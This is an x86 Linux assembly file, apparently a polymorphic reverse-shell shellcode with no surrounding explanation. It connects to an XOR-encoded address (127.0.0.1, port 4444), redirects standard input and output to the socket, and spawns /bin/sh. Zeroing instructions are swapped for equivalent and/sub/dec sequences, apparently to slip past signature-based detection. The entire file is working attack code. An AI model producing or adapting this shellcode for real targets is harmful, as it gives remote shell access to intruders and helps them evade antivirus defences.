global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    ;xor   eax, eax
sub ecx, ecx
and edx, 0x01010101
and edx, 0x02020202

    ; create sockaddr_in struct
    push  eax
    push  eax             ; [$esp]: 8 bytes of padding
    mov   eax, 0xffffffff
    xor eax, 0xfeffff80
    push eax
    push  word 0x5c11     ; [$esp]: 4444
    push  word 0x02       ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
and eax, 0x01010101
and eax, 0x02020202
sub ebx, ebx
mov ax, 0x168
 dec ax
mov bl, 0x03
 dec bl
    mov   cl, 0x01        ; $ecx: SOCK_STREAM
    int   0x80
    mov   ebx, eax        ; $ebx: socket file descriptor

    ; call connect(sockfd, sockaddr, socklen_t)
    mov   ax, 0x16a
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp        ; $ecx: size of the sockaddr struct
    int   0x80

    ; call dup2 to redirect STDIN, STDOUT and STDERR
and ecx, 0x01010101
and ecx, 0x02020202
    mov   cl, 0x3
    dup:
sub eax, eax
mov al, 0x40
 dec al
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
and eax, 0x01010101
and eax, 0x02020202
    xor   edx, edx
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
mov al, 0x0a
 inc al
    int   0x80